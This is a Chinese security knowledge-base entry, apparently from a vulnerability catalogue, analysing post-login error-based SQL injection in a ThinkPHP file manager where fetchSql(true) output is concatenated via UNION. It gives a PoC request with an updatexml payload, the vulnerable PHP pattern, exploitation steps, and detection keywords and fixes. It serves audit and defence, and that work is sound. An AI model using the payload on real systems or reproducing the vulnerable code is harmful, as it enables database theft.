---
id: web-php-framework-thinkphp-fetchsql-union-where-sqli
title: ThinkPHP fetchSql(true) 生成的未参数化 SQL 被 UNION 拼接：where 数组条件演变为 SQL 注入
type: scenario
domain: web
path: web/php/framework
technique: thinkphp-fetchsql-union-where-sqli
aliases:
- ThinkPHP fetchSql SQL注入
- fetchSql(true) 注入
- TP where 数组注入
- UNION 拼接 SQL 注入
- sk_stores sk_folders
tags:
- php
- thinkphp
- sqli
- fetchsql
- union
- source-audit
- file-manager
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V521
  verified_at: '2026-11-11T13:21:06+08:00'
  notes: 已对照原文 content.md 与全部 36 张截图（19 张大图降采样读 img_small，无读图失败）核对：index/File::list 接收 folder_id/search，调用 FileManage::listFile(folder_id,search,userInfo[id],page,limit)；getFolderPid 非空原样返回；maps 三元组数组经 fetchSql(true) 生成 SQL 文本（图16 中探测值 3' 被原样拼为 parent_folder = 3'，图14 正常执行时转义为 '3\''，图15 监控仅 SHOW COLUMNS 证明未执行）；db(folders)->union(files_sql,true)->page->select 拼接执行；PoC folder_id=1-updatexml(1,concat(0x7e,database(),0x7e),1) 报错回显 ~wangp~（图19）均一致。已修正卡片：where 数组实际形态改为 maps 三元组、FileManage/getFolderPid 名称、删除'带单引号表达式'的错误说法（PoC 无需引号）、PoC 代码块按原文结构补全、补充探测值转义/未转义对比。dedup：top 候选为 TP3 array-exp/parseWhere 特殊键/3.2 bind 占位符/where raw 等不同机制，非同链重复；dup-scan.json 无涉及本卡 pair。未验证点：未在本机复现 PoC；原文未标注产品名与版本，affected_versions 保持为空。
---

## 一句话结论

ThinkPHP 应用在文件管理列表接口中先用 `where($maps)->fetchSql(true)->select()`（`$maps` 元素形如 `['parent_folder','=',$folder_id]`）生成 SQL 文本（只生成不执行，值被原样拼入、不经参数绑定/引号转义），随后把该文本 `UNION ALL` 拼到另一条 SQL 后统一执行；攻击者向 `folder_id` 传入数字表达式（如 `1-updatexml(1,concat(0x7e,database(),0x7e),1)`，无需单引号）即可把原本“安全”的 where 数组条件变成报错型 SQL 注入，注入点在后台（需登录）的 `/file/list`。

## 原理

- **正常路径有参数绑定**：ThinkPHP 的 `where($maps)` 数组条件（元素形如 `['字段','=',$值]`）在真正执行查询时会走参数绑定/预处理，`$search`、`$folder_id` 等值会被引号包裹并转义，原文用数据库监控验证了正常 `select()` 查询没有注入。
- **fetchSql(true) 改变语义**：`fetchSql(true)` 只让 Builder 生成 SQL 字符串而不执行。原文在代码中加上 `fetchSql(true)` 后发现数据库监控只看到 `SHOW COLUMNS FROM ...`，说明后续 `where` 条件根本没有进入数据库执行；原文用探测值 `folder_id=3'` 对比：正常执行时值被转义为 `'3\''`（数据库监控可见），而 `fetchSql(true)` 生成的 SQL 文本中原样出现 `parent_folder = 3'`——值没有被引号包裹或转义（安全处理只发生在执行阶段，生成的字符串只是拼接结果）。
- **UNION 拼接是触发器**：业务代码随后构造
  ```sql
  SELECT ... FROM sk_folders WHERE ... AND folder_name LIKE '%aa%'
  UNION ALL
  ( SELECT ... FROM sk_stores WHERE `uid`=10 AND `parent_folder`=<原样拼入的 folder_id> AND ... )
  LIMIT 0,20
  ```
  把包含原样拼入值的 `$files_sql` 作为 UNION 的第二个查询拼接后执行。原文探测时该位置为 `3'`；利用时 `folder_id=1-updatexml(...)` 被原样代入数字比较语境，由 MySQL 求值表达式并触发 XPATH 报错，形成注入。
- **入口链路**：`index` 模块的 file 控制器 `list()` 接收 `folder_id`、`search`，调用 `FileManage::listFile()`；`listFile` 先调用 `self::getFolderPid($folder_id,$uid)`（传入值非空时原样返回），再把值放进 `$maps`（`['parent_folder','=',$folder_id]`）后传给 `->where($maps)`。`list()` 前有基于 `$this->userInfo['id']` 的登录鉴权，属于后台/登录后注入。
- **为什么是“0.5day”式问题**：单看 `where($maps)` 数组条件在正常执行时是安全的；危险来自“把 fetchSql 生成的 SQL 文本再次拼接执行”这种业务写法，属于框架特性与代码用法叠加。

## 触发条件

- 目标为 ThinkPHP 应用（原文为文件管理类系统，表 `sk_stores`/`sk_folders`），且存在“fetchSql 生成 SQL → UNION/字符串拼接 → 执行”的代码路径。
- 攻击者能登录后台或构造已认证请求（原文 `list()` 会校验 `$this->userInfo['id']`）。
- 拼接的 SQL 在 MySQL 中执行，报错信息可回显（原文用 `updatexml` 报错注入验证）。

## 利用步骤

1. 审计 ThinkPHP 代码：全局搜索 `fetchSql(`，排查其返回值是否被再次拼接（`union`、`->query()`、`Db::query()`、字符串替换等）。
2. 定位可控参数（原文 `folder_id`），确认其经过 `getFolderPid` 等“原样返回”的函数后进入 `where($maps)` 数组，且该 where 链启用了 `fetchSql(true)`。
3. 登录后台，向列表接口带入注入表达式；原文用 `updatexml` 报错注入回显 `database()`。
4. 按需读取数据库内容（用户表、配置表等），或结合文件管理功能进一步利用。

## PoC

原文请求（后台已登录 Cookie）：

```http
GET /file/list?folder_id=1-updatexml(1,concat(0x7e,database(),0x7e),1)&search=&page=&rows= HTTP/1.1
Host: target
X-Requested-With: XMLHttpRequest
Content-Type: application/json
Cookie: PHPSESSID=<已登录会话>
Connection: close
```

关键代码形态（原文分析的等价结构）：

```php
$maps = [
    ['uid', '=', $uid],
    ['parent_folder', '=', $folder_id], // getFolderPid 非空时原样返回
    ['delete_time', 'null', ''],
];
$files_sql = db('stores')
    ->where($maps)
    ->where('origin_name', 'like', '%' . $search . '%')
    ->field('id,uid,shares_id,origin_name as name,ext,size,count_down,count_open,update_time')
    ->fetchSql(true)          // 只生成 SQL，不执行
    ->select();
$list = db('folders')
    ->where($maps)
    ->where('folder_name', 'like', '%' . $search . '%')
    ->field('id,uid,shares_id,folder_name as name,ext,size,count_down,count_open,update_time')
    ->union($files_sql, true) // 生成的 SQL 文本作为 UNION ALL 第二段
    ->page($page, $limit)
    ->select();
```

生成的 SQL 片段示例（原文探测值 `folder_id=3'` 被原样拼入，未加引号/未转义）：

```sql
... WHERE `uid` = 10 AND `parent_folder` = 3' AND `delete_time` IS NULL AND `origin_name` LIKE '%aa%'
```

原文通过数据库监控与 `var_dump($files_sql)` 确认该差异；随后将 `folder_id=1-updatexml(1,concat(0x7e,database(),0x7e),1)` 原样代入 UNION 后的查询，报错注入成功回显数据库名（XPATH syntax error: '~wangp~'）。

## 变体与关联

- **同类写法**：`fetchSql` 结果被写入日志/缓存后由其他模块二次执行；或拼进 `Db::query()`、子查询、`union` 等。
- **框架相关**：ThinkPHP 其他注入口（调试模式 SQL 错误信息泄露）见 [[web-php-framework-thinkphp-debug-sql-error-env-credential-leak]]；ThinkPHP 的 RCE 类问题见 [[web-php-framework-thinkphp-5x-invokefunction-captcha-rce]]、[[web-php-framework-thinkphp-invokefunction-file-put-contents-webshell]]。
- **审计要点**：`fetchSql(true)` 不等于“参数已安全”，它返回的是拼接后的 SQL 文本；任何“生成 SQL 再拼接执行”的用法都应视为潜在的注入点。

## 检测与防御

- **代码修复**：不要把 `fetchSql` 的返回值拼接进 SQL 再执行；需要 union 时用查询构造器/子查询或参数化方式重新构建，确保所有值走绑定。
- **审计/代码扫描**：检索 `fetchSql(`、`->query(`、`Db::query(`、字符串 `union` 拼接的组合；对“先 fetchSql 后 union/query”的代码重点人工复核。
- **运行时**：开启 ThinkPHP 参数绑定与 SQL 日志；对包含 `updatexml`、`extractvalue`、`concat(0x7e` 等报错注入特征的请求告警；生产环境关闭详细 SQL 报错。
- **权限**：后台接口最小权限化；即便需要登录才能触发，也应视为高危（后台账号泄露、越权、CSRF 均可放大）。
